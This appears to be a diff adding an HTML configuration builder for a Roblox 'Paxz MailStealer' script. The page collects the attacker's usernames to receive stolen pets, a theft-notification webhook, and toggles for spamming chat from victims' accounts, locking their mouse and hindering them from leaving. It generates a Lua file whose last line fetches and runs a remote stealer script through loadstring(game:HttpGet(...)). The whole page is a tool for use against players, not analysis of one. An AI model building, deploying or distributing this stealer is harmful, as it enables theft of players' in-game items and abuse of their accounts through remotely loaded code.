@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Settings Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            margin-top: 30px;
+            color: #333;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .input-label {
+            display: block;
+            text-align: left;
+            margin-top: 10px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            margin-top: 5px;
+        }
+        .save-button {
+            background-color: #4CAF50;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .save-button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Settings</h1>
+        <div class="input-label">Where do you want to send pets to?</div>
+        <input type="text" class="input-field" id="userName" placeholder="Enter username">
+
+        <div class="input-label">Where do you want to send the bad pets to? (Can be the same user)</div>
+        <input type="text" class="input-field" id="userName2" placeholder="Enter username">
+
+        <div class="input-label">What's your webhook to send notifications to if pets get stolen?</div>
+        <input type="text" class="input-field" id="webhook" placeholder="Enter webhook">
+
+        <div class="input-label">What do you want as loading screen text?</div>
+        <input type="text" class="input-field" id="loadingScreenText" placeholder="Enter loading screen text">
+
+        <div class="input-label">What will get spammed in the chat (you need to set _G.ChatSpam to true if you want this)?</div>
+        <input type="text" class="input-field" id="chatMessage" placeholder="Enter chat message">
+
+        <div class="input-label">How long do you want to let it take to kick the player out of the game (over 60 sec recommend)?</div>
+        <input type="text" class="input-field" id="kickTime" placeholder="Enter kick time">
+
+        <div class="input-label">Do you want the loading screen (recommended)? Set it to true or false</div>
+        <input type="text" class="input-field" id="loadingScreen" placeholder="Enter true or false">
+
+        <div class="input-label">Do you want to make it hard to leave for the victim? Set to true or false</div>
+        <input type="text" class="input-field" id="antiLeave" placeholder="Enter true or false">
+
+        <div class="input-label">Do you want to lock the mouse of your victim? Kinda works. Need to put on true or false</div>
+        <input type="text" class="input-field" id="mouseLock" placeholder="Enter true or false">
+
+        <div class="input-label">Do you want your victim to spam the message set putted in _G.ChatMessage? Need to put true or false</div>
+        <input type="text" class="input-field" id="chatSpam" placeholder="Enter true or false">
+
+        <div class="input-label">Do you want to collect all the orbs in the game? Set to true or false</div>
+        <input type="text" class="input-field" id="collectOrbs" placeholder="Enter true or false">
+
+        <button class="save-button" onclick="saveSettings()">Save Settings</button>
+    </div>
+
+    <script>
+        function saveSettings() {
+            var userName = document.getElementById('userName').value;
+            var userName2 = document.getElementById('userName2').value;
+            var webhook = document.getElementById('webhook').value;
+            var loadingScreenText = document.getElementById('loadingScreenText').value;
+            var chatMessage = document.getElementById('chatMessage').value;
+            var kickTime = document.getElementById('kickTime').value;
+            var loadingScreen = document.getElementById('loadingScreen').value;
+            var antiLeave = document.getElementById('antiLeave').value;
+            var mouseLock = document.getElementById('mouseLock').value;
+            var chatSpam = document.getElementById('chatSpam').value;
+            var collectOrbs = document.getElementById('collectOrbs').value;
+
+            var code = `-- {{Paxz MailStealer}} --
+
+_G.UserName = "${userName}";
+_G.UserName2 = "${userName2}";
+_G.Webhook = "${webhook}";
+_G.LoadingScreenText = "${loadingScreenText}";
+_G.ChatMessage = "${chatMessage}";
+_G.KickTime = "${kickTime}";
+
+-- [[Extra Stuff]] --
+
+_G.LoadingScreen = ${loadingScreen};
+_G.AntiLeave = ${antiLeave};
+_G.MouseLock = ${mouseLock};
+_G.ChatSpam = ${chatSpam};
+_G.CollectOrbs = ${collectOrbs};
+
+-- /|\\ Script /|\\ --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))();
+`;
+
+            var blob = new Blob([code], { type: 'text/plain' });
+            var url = URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'settings.lua';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+    </script>
+</body>
+</html>
